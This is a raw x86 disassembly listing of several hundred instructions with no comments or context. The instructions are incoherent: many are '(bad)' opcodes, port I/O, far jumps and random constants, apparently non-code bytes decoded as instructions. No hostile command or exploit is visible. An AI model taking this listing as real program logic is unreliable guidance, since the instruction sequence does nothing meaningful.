  4187ea:	xor    ch,BYTE PTR [eax]
  4187ec:	mov    edi,0x1cc416ac
  4187f1:	cmp    al,0x8c
  4187f3:	out    0xef,eax
  4187f5:	xor    BYTE PTR [eax+0x39],ch
  4187f8:	mov    dl,0x0
  4187fa:	ins    DWORD PTR es:[edi],dx
  4187fb:	sar    DWORD PTR [ebp+ebp*4+0x29],1
  4187ff:	ret    0x48f
  418802:	or     eax,ebp
  418804:	pxor   mm3,QWORD PTR [ecx+0x47cb8126]
  41880b:	rol    BYTE PTR [ebx],cl
  41880d:	pusha  
  41880e:	shr    ch,cl
  418810:	nop
  418811:	call   0x437:0x6c468183
  418818:	fmul   DWORD PTR [edi-0x7c]
  41881b:	mov    al,0x9c
  41881d:	or     BYTE PTR [ebp-0x63c74d46],0x3b
  418824:	in     eax,dx
  418825:	shl    DWORD PTR [ebx-0x6503bf1],cl
  41882b:	inc    ebp
  41882c:	wbinvd 
  41882e:	push   edi
  41882f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418830:	or     BYTE PTR [edi-0x22],dl
  418833:	ins    DWORD PTR es:[edi],dx
  418834:	lahf   
  418835:	jne    0x418843
  418837:	in     eax,0xba
  418839:	mov    ds:0x17f5eda,al
  41883e:	pop    esp
  41883f:	xchg   ch,ch
  418841:	cmp    DWORD PTR [edx+0x74caa23b],esi
  418847:	ds xchg esi,eax
  418849:	aaa    
  41884a:	dec    BYTE PTR [ebx]
  41884c:	sahf   
  41884d:	cmp    dh,BYTE PTR [ebx]
  41884f:	test   BYTE PTR [eax],dh
  418851:	adc    BYTE PTR [ecx],bh
  418853:	push   eax
  418854:	mov    esi,0x4ea46c8f
  418859:	out    dx,eax
  41885a:	mov    ch,0x22
  41885c:	push   eax
  41885d:	aaa    
  41885e:	daa    
  41885f:	ror    BYTE PTR [ebx],1
  418861:	xor    BYTE PTR [eax-0x5],0xa
  418865:	cmp    al,0x2b
  418867:	push   edi
  418868:	push   edx
  418869:	jmp    0x418887
  41886b:	inc    eax
  41886c:	das    
  41886d:	retf   0xda15
  418870:	aas    
  418871:	stc    
  418872:	fwait
  418873:	and    bl,BYTE PTR [edi+0x47452fd7]
  418879:	enter  0x38c4,0xfd
  41887d:	pop    esi
  41887e:	mov    bl,0x4d
  418880:	fnstsw WORD PTR [eax]
  418882:	scas   al,BYTE PTR es:[edi]
  418883:	jmp    0x7736:0xcb52bf5e
  41888a:	jne    0x418882
  41888c:	cmp    edx,edx
  41888e:	add    eax,0xf5880703
  418893:	adc    eax,0xe50e82ec
  418898:	push   0xcbf29e73
  41889d:	xchg   edi,eax
  41889e:	add    cl,dl
  4188a0:	lock in eax,dx
  4188a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4188a3:	sar    BYTE PTR [eax],0xc3
  4188a6:	fxch   st(0)
  4188a8:	dec    eax
  4188a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188aa:	jne    0x418837
  4188ac:	je     0x4188d9
  4188ae:	sub    edi,edi
  4188b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4188b1:	pop    ds
  4188b2:	pop    ebx
  4188b3:	retf   
  4188b4:	push   ecx
  4188b5:	or     al,0xcc
  4188b7:	sbb    edi,DWORD PTR [ebx-0x29]
  4188ba:	cmp    eax,0x49fc73e4
  4188bf:	sub    ch,BYTE PTR [edx+0xa5ad92a]
  4188c5:	xchg   ebx,eax
  4188c6:	ins    BYTE PTR es:[edi],dx
  4188c7:	inc    esp
  4188c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188c9:	sub    BYTE PTR [ebx+0xcdc79dc],ah
  4188cf:	fcom   DWORD PTR [esi+0x9]
  4188d2:	inc    esp
  4188d3:	mov    ebp,0x175ef7bf
  4188d8:	add    al,0x5c
  4188da:	mov    edx,0x733c5e21
  4188df:	into   
  4188e0:	daa    
  4188e1:	jo     0x418863
  4188e3:	shr    bh,0x12
  4188e6:	adc    bh,BYTE PTR [eax+0xb]
  4188e9:	cmp    bh,bl
  4188eb:	stos   DWORD PTR es:[edi],eax
  4188ec:	in     eax,0x80
  4188ee:	and    esi,DWORD PTR [esi+0x70]
  4188f1:	or     cl,BYTE PTR [edx-0x5d]
  4188f4:	lea    esp,[edx]
  4188f6:	push   ebx
  4188f7:	pop    esi
  4188f8:	xchg   BYTE PTR [edi],cl
  4188fa:	lods   eax,DWORD PTR ds:[esi]
  4188fb:	adc    al,0x1e
  4188fd:	xchg   ecx,eax
  4188fe:	xchg   esp,eax
  4188ff:	test   BYTE PTR [eax+0x7f],cl
  418902:	scas   al,BYTE PTR es:[edi]
  418903:	loopne 0x4188c6
  418905:	sbb    eax,0x17a0a28a
  41890a:	data16 cmp BYTE PTR [edx],al
  41890d:	cmp    eax,0x3e9227bd
  418912:	cmp    DWORD PTR [eax-0x6328efd3],0x8e3de505
  41891c:	push   0x65d422fc
  418921:	call   0x88f748a
  418926:	push   esp
  418927:	fucomi st,st(2)
  418929:	lods   al,BYTE PTR ds:[esi]
  41892a:	inc    esi
  41892b:	ja     0x418904
  41892d:	xor    esp,DWORD PTR ds:0x51a32be1
  418933:	call   0x388fa9a9
  418938:	adc    DWORD PTR [ebx-0x26],esi
  41893b:	int    0xe1
  41893d:	popa   
  41893e:	stc    
  41893f:	mov    ebp,0x1ce11356
  418944:	sbb    ebp,ebx
  418946:	sub    edx,DWORD PTR [ebp+edi*4+0x6c8e21a5]
  41894d:	das    
  41894e:	or     BYTE PTR ds:0x6b631418,ch
  418954:	out    0x7b,eax
  418956:	div    ch
  418958:	xchg   ecx,eax
  418959:	in     eax,0x1c
  41895b:	xchg   esi,eax
  41895c:	jns    0x41899b
  41895e:	jmp    0xb5a2:0x9668
  418964:	jmp    0xaad0efd5
  418969:	aam    0xe7
  41896b:	dec    esi
  41896c:	xchg   esp,eax
  41896d:	rcr    esp,0x2b
  418970:	hlt    
  418971:	ror    BYTE PTR [eax-0x17324101],cl
  418977:	(bad)  
  418978:	(bad)  
  418979:	hlt    
  41897a:	and    ah,dl
  41897c:	push   esi
  41897d:	pop    es
  41897e:	fdivr  QWORD PTR [eax-0x78e7a08b]
  418984:	jmp    0xe3ca252a
  418989:	pop    esi
  41898a:	adc    BYTE PTR [ebx+edx*2],ah
  41898d:	sti    
  41898e:	mov    ebp,0x5136b230
  418993:	inc    edi
  418994:	shl    DWORD PTR [ecx],cl
  418996:	fcomp  QWORD PTR [edx+0x4b]
  418999:	es stos DWORD PTR es:[edi],eax
  41899b:	das    
  41899c:	pop    ds
  41899d:	inc    esi
  41899e:	jmp    0xa4a5:0x2a362079
  4189a5:	ss pop eax
  4189a7:	repz jecxz 0x4189b5
  4189aa:	adc    BYTE PTR [edi+0x4ba3148b],bh
  4189b0:	lods   al,BYTE PTR ds:[esi]
  4189b1:	cs aam 0x4d
  4189b4:	pushf  
  4189b5:	js     0x418997
  4189b7:	jbe    0x418987
  4189b9:	xchg   esp,eax
  4189ba:	out    0xaa,al
  4189bc:	daa    
  4189bd:	out    0xf,eax
  4189bf:	dec    eax
  4189c0:	jno    0x4189fc
  4189c2:	pop    ecx
  4189c3:	xor    edx,edi
  4189c5:	pop    edi
  4189c6:	das    
  4189c7:	mov    ebp,0xf0bfbbc6
  4189cc:	call   0x2711560a
  4189d1:	sub    DWORD PTR [edx],ecx
  4189d3:	and    BYTE PTR [esi+0x7cdc1642],dh
  4189d9:	mov    esp,0x5d5e2777
  4189de:	js     0x4189d1
  4189e0:	(bad)  
  4189e1:	fst    QWORD PTR [ebp+0x58]
  4189e4:	dec    ebp
  4189e5:	dec    edi
  4189e6:	push   cs
  4189e7:	aad    0x8f
  4189e9:	fsub   QWORD PTR [ecx+0x1a]
  4189ec:	inc    esp
  4189ed:	jle    0x4189a3
  4189ef:	scas   al,BYTE PTR es:[edi]
  4189f0:	stos   BYTE PTR es:[edi],al
  4189f1:	cmp    eax,0x6e3a0e39
  4189f6:	(bad)  
  4189f7:	sti    
  4189f8:	lahf   
  4189f9:	(bad)  
  4189fa:	outs   dx,BYTE PTR ds:[esi]
  4189fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4189fc:	xchg   edi,eax
  4189fd:	loope  0x418983
  4189ff:	in     al,dx
  418a00:	push   cs
  418a01:	pop    ds
  418a02:	ins    BYTE PTR es:[edi],dx
  418a03:	xor    edx,DWORD PTR [esi+0x43]
  418a06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a07:	test   al,0x53
  418a09:	fcmovnu st,st(0)
  418a0b:	cmc    
  418a0c:	mov    edi,0x409c0c91
  418a11:	ret    0xee33
  418a14:	inc    eax
  418a15:	pop    ebp
  418a16:	jle    0x4189e8
  418a18:	jno    0x418a8c
  418a1a:	mov    dl,0xe5
  418a1c:	mov    eax,0xec0b2bdd
  418a21:	dec    edi
  418a22:	mov    bh,0xea
  418a24:	cmp    esp,DWORD PTR [edx+0x212cb5ed]
  418a2a:	arpl   di,si
  418a2c:	frstor [ebp-0x79]
  418a2f:	ja     0x418a54
  418a31:	in     al,0xe6
  418a33:	xchg   ecx,eax
  418a34:	cmp    DWORD PTR [edx+0x27c0b68b],0x11cd50d1
  418a3e:	sub    BYTE PTR [ebp+0x75a23e37],0x6e
  418a45:	call   0x9975:0xb03c366
  418a4c:	fmul   DWORD PTR [edx]
  418a4e:	sbb    BYTE PTR [ebp+esi*1-0x3df0e062],ah
  418a55:	xchg   edi,eax
  418a56:	outs   dx,BYTE PTR ds:[esi]
  418a57:	mov    ds:0xf41dc65c,eax
  418a5c:	jo     0x418aa5
  418a5e:	(bad)  
  418a5f:	cwde   
  418a60:	mov    al,0x24
  418a62:	leave  
  418a63:	sbb    BYTE PTR [ecx],0x92
  418a66:	cmp    al,0x35
  418a68:	dec    ebp
  418a69:	push   ds
  418a6a:	xor    al,0x79
  418a6c:	xchg   ebx,eax
  418a6d:	pop    es
  418a6e:	popa   
  418a6f:	(bad)  
  418a70:	adc    eax,0x26587d0c
  418a75:	mov    WORD PTR [eax],ss
  418a77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a78:	xor    eax,0x6776467b
  418a7d:	ins    BYTE PTR es:[edi],dx
  418a7e:	nop
  418a7f:	sub    eax,0x1b99f8d2
  418a84:	in     eax,dx
  418a85:	jbe    0x418a3e
  418a87:	or     al,BYTE PTR [ebx]
  418a89:	jae    0x418a3e
  418a8b:	pop    es
  418a8c:	dec    edx
  418a8d:	test   DWORD PTR [ecx],ebx
  418a8f:	test   BYTE PTR [edi],0xbb
  418a92:	pop    ebx
  418a93:	adc    al,0xed
  418a95:	gs mov ecx,0x5fde8ce
  418a9b:	imul   esp,DWORD PTR [ebp+0x68],0x2d
  418a9f:	sub    dh,cl
  418aa1:	inc    ecx
  418aa2:	xor    BYTE PTR [ecx+0x4023277f],bl
  418aa8:	xchg   DWORD PTR [ebx-0x36],edi
  418aab:	jne    0x418a73
  418aad:	sar    DWORD PTR [edx+0x5314e1ad],1
  418ab3:	pop    ds
  418ab4:	jae    0x418a3f
  418ab6:	cmp    eax,0x2dbac8a
  418abb:	sub    eax,0xfe35a0a6
  418ac0:	sbb    edi,DWORD PTR [edi+0x11db0bef]
  418ac6:	mov    DWORD PTR [edi-0x76f96bb],ecx
  418acc:	jmp    DWORD PTR [eax+0x7d661fb1]
  418ad2:	xor    ah,dh
  418ad4:	out    dx,eax
  418ad5:	xchg   ebx,eax
  418ad6:	sar    BYTE PTR [edi+0x66],0xd8
  418ada:	dec    ebx
  418adb:	jns    0x418ad9
  418add:	loop   0x418b22
  418adf:	and    BYTE PTR [eax+0x15],0x3
  418ae3:	add    eax,0xc17dd7b
  418ae8:	repz or eax,DWORD PTR [ebx+0x2e]
  418aec:	push   ds
  418aed:	mov    ah,0x91
  418aef:	adc    cl,dl
  418af1:	mov    eax,0xaa81c71c
  418af6:	in     eax,0x68
  418af8:	push   edx
  418af9:	shl    edi,1
  418afb:	adc    al,0x4f
  418afd:	scas   eax,DWORD PTR es:[edi]
  418afe:	inc    ebp
  418aff:	test   DWORD PTR [edx+0x2c],0xc67afa61
  418b06:	push   ss
  418b07:	mov    ebx,0xa3529fcc
  418b0c:	cmp    eax,0x6aede773
  418b11:	push   edi
  418b12:	jmp    0x418a9a
  418b14:	rol    DWORD PTR [ecx-0xf],0x24
  418b18:	xchg   DWORD PTR [ebp-0x12faad42],esp
  418b1e:	push   esi
  418b1f:	out    dx,eax
  418b20:	retf   0x9d08
  418b23:	xor    al,0xb8
  418b25:	push   es
  418b26:	out    0x43,eax
  418b28:	add    al,0x10
  418b2a:	xchg   edx,eax
  418b2b:	pop    ecx
  418b2c:	and    DWORD PTR [eax+0x67b1278d],esi
  418b32:	dec    esp
  418b33:	mov    DWORD PTR [esi+0x13fdda42],eax
  418b39:	pop    eax
  418b3a:	int3   
  418b3b:	and    DWORD PTR [edi],ebp
  418b3d:	stos   BYTE PTR es:[edi],al
  418b3e:	mov    ebp,0xdae11e0
  418b43:	xchg   ebp,eax
  418b44:	and    dl,BYTE PTR [esi-0x61]
  418b47:	and    al,0x3b
  418b49:	sti    
  418b4a:	push   ebx
  418b4b:	xor    esi,DWORD PTR [edi]
  418b4d:	xchg   ebp,eax
  418b4e:	pusha  
  418b4f:	imul   DWORD PTR [eax]
  418b51:	sbb    bh,BYTE PTR ds:0xeb15611b
  418b57:	retf   
  418b58:	add    edx,ecx
  418b5a:	div    BYTE PTR [eax+edi*4+0x7b16a077]
  418b61:	fistp  WORD PTR [ebp+0x46]
  418b64:	pop    ds
  418b65:	jle    0x418b28
  418b67:	or     eax,DWORD PTR [edi]
  418b69:	fdiv   DWORD PTR [edi-0x1c]
  418b6c:	lods   al,BYTE PTR ds:[esi]
  418b6d:	(bad)  
  418b6e:	out    dx,al
  418b6f:	dec    edi
  418b70:	cmp    al,cl
  418b72:	test   DWORD PTR ds:[edx],eax
  418b75:	add    DWORD PTR [ebx],ecx
  418b77:	fwait
  418b78:	push   ebp
  418b79:	(bad)  
  418b7a:	cld    
  418b7b:	fnsave [edi]
  418b7d:	js     0x418b58
  418b7f:	stos   BYTE PTR es:[edi],al
  418b80:	or     BYTE PTR [edi+0x28b0aae0],dh
  418b86:	add    bl,dh
  418b88:	xchg   ebx,eax
  418b89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b8a:	jb     0x418b87
  418b8c:	je     0x418b15
  418b8e:	(bad)  
  418b8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b90:	pop    edx
  418b91:	lods   eax,DWORD PTR ds:[esi]
  418b92:	adc    DWORD PTR [ecx],ebx
  418b94:	xchg   cl,bh
  418b96:	adc    ebx,DWORD PTR [esi+0x1ca35613]
  418b9c:	add    DWORD PTR [edi],ebp
  418b9e:	push   edx
  418b9f:	sub    bl,ch
  418ba1:	inc    ebx
  418ba2:	mov    edx,0xe5bd8ad0
  418ba7:	fdiv   QWORD PTR [edi+0x1d6c3a44]
  418bad:	popa   
  418bae:	mov    ecx,0x36b01f3
  418bb3:	mov    dl,0xf9
  418bb5:	inc    edx
  418bb6:	aad    0xab
  418bb8:	xchg   ebx,eax
  418bb9:	out    0x11,eax
  418bbb:	xor    DWORD PTR [ecx+0x4e],0xffffffe8
  418bbf:	xchg   ebx,eax
  418bc0:	mov    eax,0x56f37c99
  418bc5:	in     eax,dx
  418bc6:	data16 lock in al,dx
  418bc9:	mov    al,0x74
  418bcb:	es loope 0x418bfc
  418bce:	fcom   DWORD PTR [edx]
  418bd0:	jg     0x418b78
  418bd2:	out    dx,al
  418bd3:	xchg   ebx,eax
  418bd4:	mul    BYTE PTR [esi]
  418bd6:	out    dx,al
  418bd7:	xchg   edx,eax
  418bd8:	adc    BYTE PTR [esi],bh
  418bda:	js     0x418b95
  418bdc:	test   DWORD PTR [edi-0x24],0xbe56501a
  418be3:	mov    dl,0x90
  418be5:	cli    
  418be6:	adc    dh,ch
  418be8:	loope  0x418b87
  418bea:	xor    edi,ecx
  418bec:	push   es
  418bed:	adc    ch,BYTE PTR [esi-0x17a80f20]
  418bf3:	mov    eax,0xeedc7e8e
  418bf8:	cmp    al,0xe1
  418bfa:	push   0x32
  418bfc:	mov    al,ds:0xade1b85f
  418c01:	rol    DWORD PTR ds:0xf6219807,0xcb
  418c08:	scas   eax,DWORD PTR es:[edi]
  418c09:	arpl   WORD PTR [edx-0x32c9b081],dx
  418c0f:	xor    eax,0x7d681624
  418c14:	mov    al,ds:0x419428fd
  418c19:	std    
  418c1a:	repnz xchg esp,eax
  418c1c:	dec    ecx
  418c1d:	ds mov cl,0xa1
  418c20:	call   0xbfdf:0x29bda17
  418c27:	repnz cmp bh,BYTE PTR [ebp+0x6ca46709]
  418c2e:	cmp    cl,ch
  418c30:	mov    edi,0x6366aac
  418c35:	dec    edx
  418c36:	pop    ecx
  418c37:	call   0x7c4a:0xb9520687
  418c3e:	mov    al,ds:0xc36df8d6
  418c43:	pushf  
  418c44:	inc    ebx
  418c45:	mov    bh,BYTE PTR [edx]
  418c47:	inc    esp
  418c48:	xchg   edx,eax
  418c49:	in     eax,0x8c
  418c4b:	(bad)  
  418c4c:	jno    0x418c81
  418c4e:	fucomi st,st(0)
  418c50:	xchg   ebp,eax
  418c51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c52:	dec    DWORD PTR [ebx-0x54]
  418c55:	mov    al,BYTE PTR [edx]
  418c57:	push   ebp
  418c58:	iret   
  418c59:	fld    DWORD PTR [eax]
  418c5b:	sub    al,0x5d
  418c5d:	gs int3 
  418c5f:	fst    DWORD PTR [ebx+0x356d8323]
  418c65:	push   ecx
  418c66:	sar    DWORD PTR fs:[ebx],0x33
  418c6a:	mov    edx,DWORD PTR [eax+edi*4]
  418c6d:	stos   BYTE PTR es:[edi],al
  418c6e:	call   0xd870:0x114e88c4
  418c75:	(bad)  
  418c76:	push   0x3918467c
  418c7b:	push   ds
  418c7c:	lods   eax,DWORD PTR ds:[esi]
  418c7d:	inc    ebx
  418c7e:	in     eax,0xa8
  418c80:	jo     0x418cb1
  418c82:	je     0x418c7d
  418c84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c85:	mov    eax,ds:0xd8cb1e25
  418c8a:	arpl   WORD PTR [eax-0x45b88fe2],dx
  418c90:	adc    DWORD PTR [esi],esi
  418c92:	aas    
  418c93:	mov    DWORD PTR [edi+edi*8-0x60],edx
  418c97:	out    dx,eax
  418c98:	stc    
  418c99:	fdivr  QWORD PTR [eax]
  418c9b:	lods   eax,DWORD PTR ds:[esi]
  418c9c:	or     al,0xb1
  418c9e:	popf   
  418c9f:	dec    ebx
  418ca0:	ins    DWORD PTR es:[edi],dx
  418ca1:	sbb    al,BYTE PTR [edx+eax*1]
  418ca4:	outs   dx,BYTE PTR ds:[esi]
  418ca5:	push   ebx
  418ca6:	xlat   BYTE PTR ds:[ebx]
  418ca7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ca8:	jmp    0xf395d84a
  418cad:	sub    eax,0xec016fb
  418cb2:	xor    BYTE PTR [eax+0x4d7842c7],dh
  418cb8:	arpl   WORD PTR [edx+0xb5e35a2],sp
  418cbe:	mov    ebp,0xa33afb13
  418cc3:	clc    
  418cc4:	push   esp
  418cc5:	out    0x46,eax
  418cc7:	lahf   
  418cc8:	cs mov ah,0xb2
  418ccb:	push   cs
  418ccc:	cmc    
  418ccd:	imul   esi,DWORD PTR [ebp-0x3],0xa985ea94
  418cd4:	xor    ecx,DWORD PTR [edx]
  418cd6:	clc    
  418cd7:	sbb    BYTE PTR [ebx+0x4f8b918f],ah
  418cdd:	mov    ds:0x5e6d9004,eax
  418ce2:	and    BYTE PTR [eax+0xbd5e6ce],cl
  418ce8:	test   BYTE PTR [ebx+0x28bf8e5c],al
  418cee:	mov    DWORD PTR [ebp+0x48d7905e],edx
  418cf4:	fadd   DWORD PTR es:[edi-0x24b31e52]
  418cfb:	adc    eax,0x1554a3e5
  418d00:	outs   dx,BYTE PTR ds:[esi]
  418d01:	xchg   ecx,eax
  418d02:	fist   WORD PTR [ebx-0x94dfb51]
  418d08:	jo     0x418d56
  418d0a:	dec    ecx
  418d0b:	int    0x50
  418d0d:	(bad)  
  418d0e:	or     al,0xd2
  418d10:	popa   
  418d11:	ins    BYTE PTR es:[edi],dx
  418d12:	pop    ebp
  418d13:	mov    ah,0x14
  418d15:	test   BYTE PTR [ebx],0x72
  418d18:	daa    
  418d19:	(bad)  
  418d1a:	fidivr WORD PTR [esi-0x7da379c4]
  418d20:	clc    
  418d21:	jns    0x418d64
  418d23:	pop    eax
  418d24:	sahf   
  418d25:	loope  0x418d83
  418d27:	xchg   ecx,eax
  418d28:	jmp    FWORD PTR [edx]
  418d2a:	inc    edi
  418d2b:	pop    eax
  418d2c:	push   esp
  418d2d:	add    ecx,0x13412cb8
  418d33:	push   edx
  418d34:	push   0x3a
  418d36:	out    dx,al
  418d37:	int    0x18
  418d39:	enter  0x7983,0x2a
  418d3d:	mov    bh,0x4e
  418d3f:	cmp    al,0xd7
  418d41:	ret    0x2b09
  418d44:	mov    eax,0x9e5e9263
  418d49:	jg     0x418cf2
  418d4b:	and    ebp,DWORD PTR [ebx-0x77f2d417]
  418d51:	loopne 0x418dbb
  418d53:	stc    
  418d54:	jne    0x418d60
  418d56:	fst    DWORD PTR [edi+0x53]
  418d59:	dec    eax
  418d5a:	inc    esp
  418d5b:	int3   
  418d5c:	fistp  WORD PTR [edx-0x3242a8fa]
  418d62:	sbb    al,al
  418d64:	jbe    0x418d8d
  418d66:	push   ebx
  418d67:	sub    cl,ch
  418d69:	cwde   
  418d6a:	daa    
  418d6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d6c:	dec    edi
  418d6d:	push   esp
  418d6e:	aad    0xcb
  418d70:	or     dl,BYTE PTR [ebx-0x1cca735]
  418d76:	stc    
  418d77:	cs jns 0x418cfe
  418d7a:	push   0x40
  418d7c:	js     0x418d6f
  418d7e:	mov    ds:0xe20b78a8,eax
  418d83:	imul   edx,DWORD PTR [edi+0x29],0x36
  418d87:	xchg   esp,eax
  418d88:	add    BYTE PTR [ebx-0x16a48c66],0xd5
  418d8f:	and    edi,edx
  418d91:	jp     0x418d38
  418d93:	or     cl,BYTE PTR [edi]
  418d95:	(bad)  
  418d97:	push   0xffffffed
  418d99:	in     al,dx
  418d9a:	jl     0x418e1b
  418d9c:	sub    BYTE PTR [esi],ch
  418d9e:	fsub   DWORD PTR [ebp+0x30df84cc]
  418da4:	adc    BYTE PTR [ecx+edx*1+0x76],0x87
  418da9:	imul   esi,esp,0x352f4932
  418daf:	test   eax,0x215f281e
  418db4:	outs   dx,DWORD PTR ds:[esi]
  418db5:	(bad)  
  418db6:	gs pop ecx
  418db8:	hlt    
  418db9:	lea    edx,[ebp+0xe]
  418dbc:	mov    ds:0x632f359f,eax
  418dc1:	stc    
  418dc2:	push   esp
  418dc3:	fadd   st,st(5)
  418dc5:	call   0x88b4:0x47996de9
  418dcc:	lea    ebp,[ebx]
  418dce:	fucomp st(1)
  418dd0:	inc    ecx
  418dd1:	add    BYTE PTR [edx-0x5bdbcacc],ah
  418dd7:	cli    
  418dd8:	dec    edx
  418dd9:	jl     0x418d98
  418ddb:	daa    
  418ddc:	dec    eax
  418ddd:	xor    ebp,esp
  418ddf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418de0:	retf   0x1530
  418de3:	cmp    BYTE PTR [eax+0x3d],ch
  418de6:	out    0xfc,al
  418de8:	mov    eax,ds:0x245cd71a
  418ded:	ror    ch,0x64
  418df0:	dec    edx
  418df1:	push   edi
  418df2:	ror    DWORD PTR [eax-0x7e],0xe2
  418df6:	push   edx
  418df7:	sbb    al,bl
  418df9:	mov    bl,0x4e
  418dfb:	enter  0x74aa,0x66
  418dff:	push   0xa4865865
  418e04:	or     BYTE PTR [esi+0x6a],ah
  418e07:	pop    ebp
  418e08:	aas    
  418e09:	adc    dh,cl
  418e0b:	rcr    BYTE PTR [ebp+0x266358a9],0x39
  418e12:	(bad)  
  418e13:	into   
  418e14:	mov    ebx,0x9ef59ada
  418e19:	push   es
  418e1a:	aam    0x26
  418e1c:	xor    eax,DWORD PTR [esp+eax*4-0x40]
  418e20:	mov    ds:0x91a0c9da,al
  418e25:	inc    esp
  418e26:	mov    dh,0x66
  418e28:	ret    
  418e29:	gs mov esi,0x9b3e2767
  418e2f:	ja     0x418e35
  418e31:	cdq    
  418e32:	aas    
  418e33:	sub    eax,0xfcaced7c
  418e38:	adc    DWORD PTR [eax-0x5b],ecx
  418e3b:	dec    ebp
  418e3c:	test   BYTE PTR [esi-0x77],0xf2
  418e40:	enter  0x3d48,0xcf
  418e44:	adc    edx,DWORD PTR [ecx+0x5f]
  418e47:	mov    ah,0x7f
  418e49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e4a:	sahf   
  418e4b:	(bad)  
  418e4c:	xchg   esp,eax
  418e4d:	fcomp  DWORD PTR [ecx]
  418e4f:	js     0x418e31
  418e51:	aam    0x44
  418e53:	jl     0x418def
  418e55:	scas   eax,DWORD PTR es:[edi]
  418e56:	int    0xdb
  418e58:	add    DWORD PTR [edi-0x16],ecx
  418e5b:	dec    ebp
  418e5c:	mov    al,ds:0xa2ceb5b4
  418e61:	in     eax,0x43
  418e63:	mov    edx,0x1b794f7c
  418e68:	sbb    BYTE PTR [edx+eax*4-0x35da3c04],ah
  418e6f:	fs jecxz 0x418e23
  418e72:	xchg   BYTE PTR [ebx+0x2d],bl
  418e75:	cli    
  418e76:	pop    ds
  418e77:	mov    al,ds:0x4c4f6afe
  418e7c:	jmp    0x3f6:0x12807cd6
  418e83:	dec    edx
  418e84:	add    al,0x5c
  418e86:	cdq    
  418e87:	and    DWORD PTR [ebp+ebx*1+0x43],esi
  418e8b:	jge    0x418ea1
  418e8d:	aam    0x6b
  418e8f:	push   esp
  418e90:	in     eax,0x5d
  418e92:	xchg   BYTE PTR [edi+0x4fb33830],dl
  418e98:	sbb    al,0x93
  418e9a:	ins    DWORD PTR es:[edi],dx
  418e9b:	test   eax,0x8c778472
  418ea0:	sahf   
  418ea1:	into   
  418ea2:	mov    ebp,0x4a76157f
  418ea7:	xchg   ecx,eax
  418ea8:	add    al,0x8c
  418eaa:	ins    DWORD PTR es:[edi],dx
  418eab:	add    eax,DWORD PTR [eax+0x25]
  418eae:	aas    
  418eaf:	repz leave 
  418eb1:	sub    esp,DWORD PTR [edx]
  418eb3:	xchg   edx,eax
  418eb4:	mov    ch,0x0
  418eb6:	pop    ss
  418eb7:	aam    0xb3
  418eb9:	js     0x418ebc
  418ebb:	dec    esi
  418ebc:	sbb    ecx,esp
  418ebe:	add    ebp,esp
  418ec0:	dec    BYTE PTR [edi-0x60]
  418ec3:	aas    
  418ec4:	loope  0x418ed0
  418ec6:	(bad)
  418ec9:	push   esi
  418eca:	leave  
  418ecb:	jo     0x418efc
  418ecd:	sbb    BYTE PTR [ecx],ah
  418ecf:	test   BYTE PTR [eax-0x57],bl
  418ed2:	rcl    BYTE PTR [ebx-0x5c],0xf
  418ed6:	add    ebx,DWORD PTR [esi]
  418ed8:	into   
  418ed9:	dec    edx
  418eda:	imul   edx,ebx,0x8a6782eb
  418ee0:	stos   DWORD PTR es:[edi],eax
  418ee1:	mov    dl,0x7c
  418ee3:	in     al,0x1b
  418ee5:	jl     0x418eb3
  418ee7:	icebp  
  418ee8:	cmp    BYTE PTR cs:[eax],0x5e
  418eec:	xor    eax,0xbcdfaafd
  418ef1:	loop   0x418e8a
  418ef3:	mov    esi,0xea2e189e
  418ef8:	or     al,0xe0
  418efa:	(bad)  
  418efb:	data16 mov ah,0x95
  418efe:	mov    ds:0x6a210bc0,eax
  418f03:	in     al,0xb8
  418f05:	pop    ds
  418f06:	dec    esi
  418f07:	lahf   
  418f08:	xchg   edx,eax
  418f09:	mov    al,ds:0x4bba83c3
  418f0e:	leave  
  418f0f:	inc    edx
  418f10:	sub    eax,0x22e60dc3
  418f15:	(bad)  
  418f16:	adc    edi,DWORD PTR [ebx-0x13]
  418f19:	add    ecx,DWORD PTR [eax+0x16]
  418f1c:	pop    eax
  418f1d:	retf   0x37ea
  418f20:	push   ecx
  418f21:	pusha  
  418f22:	ja     0x418f7c
  418f24:	fisub  DWORD PTR [ecx]
  418f26:	test   DWORD PTR [ebx+0xe9e566a],0xfad88635
  418f30:	and    edi,edi
  418f32:	gs aam 0x4b
  418f35:	repnz sar BYTE PTR [esi],1
  418f38:	lods   eax,DWORD PTR ds:[esi]
  418f39:	cmp    ecx,DWORD PTR [edi]
  418f3b:	add    DWORD PTR [eax],edx
  418f3d:	lahf   
  418f3e:	push   0xffffffca
  418f40:	stc    
  418f41:	imul   esi,ebp,0xa2724282
  418f47:	leave  
  418f48:	pusha  
  418f49:	inc    ecx
  418f4a:	mov    ah,0x23
  418f4c:	mov    ecx,0x7355bb59
  418f51:	dec    ecx
  418f52:	outs   dx,BYTE PTR ds:[esi]
  418f53:	bound  ecx,QWORD PTR [ebx-0x54d48183]
  418f59:	fcomp  QWORD PTR [ebp+0x7d50103a]
  418f5f:	add    ch,BYTE PTR [edx]
  418f61:	mov    al,ds:0x5f08a5dc
  418f66:	sbb    BYTE PTR [ecx],ch
  418f68:	int    0xc5
  418f6a:	aam    0x48
  418f6c:	dec    ecx
  418f6d:	out    0xed,al
  418f6f:	cld    
  418f70:	adc    al,0x67
  418f72:	sub    al,0x1
  418f74:	ds dec edx
  418f76:	xchg   esp,eax
  418f77:	das    
  418f78:	clc    
  418f79:	push   0x6c8af386
  418f7e:	lds    edx,FWORD PTR [ebp-0x4a]
  418f81:	(bad)  
